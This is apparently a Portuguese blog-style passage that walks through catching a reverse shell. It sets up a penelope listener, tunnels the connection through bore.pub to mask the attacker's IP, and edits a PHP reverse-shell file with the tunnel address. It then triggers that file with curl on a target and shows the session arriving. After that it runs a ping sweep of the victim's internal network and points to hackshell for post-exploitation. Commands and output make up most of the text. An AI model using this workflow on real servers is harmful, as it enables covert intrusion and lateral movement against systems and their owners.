Irei usar um shell-handler porque facilita a minha vida (`ele já sobe a interação do shell pra tty`).

repositorio do shell-handler aqui -> [`brightio/penelope`](https://github.com/brightio/penelope)

fez a instalação do pacote? basta digitar `penelope`, ele já vem na porta 4444 por padrão, que foi a porta que nós abrimos localmente para conexão loopback!

```bash
32@64~# penelope                         
[+] Listening for reverse shells on 0.0.0.0:4444 -> 127.0.0.1 • $tun1 • $tun2
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

Agora é triggar uma shell por ai...

Vou pegar o IP do servidor do bore.pub

```shell
32@64~# ping bore.pub -c1
PING bore.pub (159.223.110.159) 56(84) bytes of data.
64 bytes from bore.pub (159.223.110.159): icmp_seq=1 ttl=52 time=228 ms
```

Pronto, o IP do bore.pub é: `159.223.110.159`


agora é montar com a porta disponibilizada pelo server do bore! (`4788`)

Dito isso iremos usar `159.223.110.159:4788` para receber o shell reverso! rsrsrsrs



irei usar um arquivo generico de reverse-shell (`reverse-shell.php`), então tenho que modificar as variaveis!

```PHP
$ip = '159.223.110.159';  // CHANGE THIS
$port = 4788;       // CHANGE THIS
```

> Esse arquivo pode ser qualquer arquivo generico de reverse-shell.

agora vou triggar o shell!

```
curl target.com/reverse-shell.php
```

conexão recebida!

```
INFO proxy{id=#root}: bore_cli::client: new connection
```

```
[+] [New Reverse Shell] => &&&&&&& 127.0.0.1 Linux-x86_64 👤 &&&&&&&(1000) 😍️ Session ID <1>
```

Ótimo, conseguimos a shell e mascaramos nosso IP através do tunnel!
  
  
  
  
  
# pgswp.sh : D
  

```ascii
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣦⢀⣷⣧⣡⣶⡄⣠⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠈⠛⠁⠘⠋⠀⠿⠋⢻⡿⢿⣤⣴⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠃⢷⢿⣶⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢹⡿⣶⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠣⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡜⢡⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⢡⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡷⠷⠦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⢁⡞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡏⠀⠀⠀⠈⢳⡀⠀⠀⠀⠀⠀⠀⠀⠀▗▖⠁▗▖▗▄▄▄▖▗▖⠀▗▖▗▄▄▄▖▗▖⠀▗▖▗▄▄▄▖
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠃⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀▐▌⣸▐▌▐▌⠀⠀⠀▐▌⠀▐▌▐▌⠀⠀⠀▐▌⠀▐▌▐▌   
⠀⠀⠀⠀⠀⠀⠀⡾⠛⠙⠚⢧⡀⠀⠀⠀⣠⠇⠀⠀⠀⠀⠀⠀⠀⠀▐▛▀▜▌▐▛▀▀▘▐▛▀▜▌▐▛▀▀▘▐▛▀▜▌▐▛▀▀▘
⠀⠀⠀⠀⠀⠀⠀⢷⣄⣄⠀⠀⠙⠒⠒⠚⠁⠀⠀⠀⠀⠀⠀⠀⠀⢰▐▌⠀▐▌▐▙▄▄▖▐▌⠀▐▌▐▙▄▄▖▐▌⠀▐▌▐▙▄▄▖
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣹⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⣶⣤⠀⠈⢸⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    
⠀⠀⠀⠀⠀⠀⠀⠀⢰⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣘⠿⠋⣼⠀⠀⣸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⠦⣄⣀⠀⠀⠀⠀⠀⠀⠀⢈⣻⣏⡁⠀⠀⢹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    
⠀⠀⠀⠀⠀⣄⣤⡀⠀⠀⠀⠀⠉⠉⠙⠒⠒⠒⣯⠹⡍⢫⡈⡷⠀⠀⠈⣧⠀⠀⠀⠀⢀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    
⠀⠀⠀⢠⡖⢿⣇⠉⢣⡀⠀⠀⠀⠀⠀⠀⠀⠀⢨⡗⠺⠒⠋⠁⢀⣠⣤⣽⣦⣤⣶⡋⠙⠓⠒⣿⡖⠦⢤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    
⠀⣠⡾⢻⣷⠾⠿⠃⠀⢙⢦⡀⠀⠀⠀⠀⠀⠀⠈⢛⣲⣆⣠⣶⣏⣉⠀⠉⠉⠻⢾⣝⡿⣦⡀⢸⣧⠀⠀⠀⠈⠉⡳⢦⡀⠀⣴⣦⣀⣀⠀⠀    
⢸⣟⣷⢤⣷⣶⢿⠀⠀⠀⠠⠝⢦⣀⠀⠀⢀⣀⣾⠟⠉⠉⠉⠉⣿⠻⠀⠀⠀⠀⠀⠈⠻⢮⡻⠿⣿⣀⠀⠀⠀⠀⠀⠙⠼⢻⡇⠞⢋⣿⠀⠀    
⢸⢉⠙⠛⢿⣧⠼⣧⣀⠀⠀⠀⠁⠈⠉⠉⠉⠀⣿⠀⠀⠀⠀⠀⠛⢀⠀⠀⡀⠀⠀⠀⠀⠈⠛⠛⠳⢮⣝⡶⣤⣄⡀⠀⠀⠀⠀⠠⠞⢳⣲⡆    
⢸⠈⢳⡀⠀⠀⠀⡏⠙⢷⣄⠀⠀⠀⠀⠀⠀⠀⢹⣇⠀⠀⠍⠛⣠⣿⠀⠀⠃⢀⡀⠆⠆⠾⡄⢠⣤⣠⣝⣿⣮⠻⡝⠳⣄⡀⠀⣠⠾⠚⠉⠁    
⣸⠀⢠⠇⠀⠀⠀⣇⠀⠀⠉⠳⣤⡀⠀⠀⠀⠀⠀⢹⣷⣀⣴⣾⣟⠁⠀⠠⣀⣌⣱⣿⣿⠿⠛⠛⠉⠉⠉⠛⢿⣶⣿⠀⠈⠉⠉⠁⠀⠀⠀⠀    
⣿⠶⠋⠀⠀⠀⠀⣇⠀⠀⠀⠀⠀⠈⠉⠙⠛⠛⠉⠉⠈⠉⠁⠀⣿⡆⠀⣂⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠠⠀⢸⣿⡧⠀⠀⠀⠀⠀⠀⠀⠀⠀    
⠿⣄⣀⠀⠀⢠⣼⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣁⣼⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀    
⠀⠈⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣼⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠼⢿⣿⣤⠀⠀⠀⠀⠀⠀⠀⠀    
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀    
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡞⠁⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣶⣶⣤⣤⡶⠟⠉⢸⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀    
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡾⠀⠀⠀⠀⣙⣿⣿⣿⣿⣿⣿⠏⠀⠘⣿⣿⡇⠀⠀⠀⠘⠳⣤⡤⢤⣄⠀⠀⠀⠀⠀    
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⢧⠀⠀⠀⢸⣿⠀⠀⠈⠉⠉⠋⠀⠀⠀⠈⠉⢻⣵⡀⠀⠀⣠⠋⣠⠞⠋⢩⣿⣿⣄⠀    
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⣦⣀⣀⣨⡟⢦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠦⣤⣠⡇⢠⣿⠷⣦⡟⡟⠀⢻⠀    
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣼⢧⣤⣬⣭⣥⠤⠿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⣾⣧⢀⣿⢰⠁⠀⡾⠀    
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠁⠀⠀⠀⠀⠀⠀⠀⣘⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠉⠈⠙⡏⢸⠀⠀⡇⠀    
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠿⠦⠤⠤⢤⣠⠤⠤⠤⠖⠚⢉⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣟⣛⡳⠶⠞⣣⡎⣀⡼⠃⠀    
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠲⠤⠤⠤⠤⠤⠤⠤⠔⠚⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⡉⠉⢉⡁⠀⠀⠀⠀    
```



agora só irei fazer um pingsweep através do tunnel pra ver se tudo funciona!

```bash
srvdata07@serv ~ $ ./pgswp.sh 
192.168.0.1 is alive
192.168.0.2 is alive
192.168.0.5 is alive
192.168.0.7 is alive
192.168.0.11 is alive
192.168.0.13 is alive
192.168.0.61 is alive
192.168.0.65 is alive
192.168.0.68 is alive
192.168.0.77 is alive
192.168.0.83 is alive
192.168.0.89 is alive
192.168.0.97 is alive
192.168.0.98 is alive
192.168.0.113 is alive
192.168.0.122 is alive
192.168.0.134 is alive
192.168.0.240 is alive
192.168.0.249 is alive
```

`a pista tá salgada ein sysadmin!`

Agora pra ficar melhor ainda!

já no reverse shell interativo, utilize um [`hack-shell`](https://github.com/hackerschoice/hackshell) do thehackerschoice!
  
bye! :p
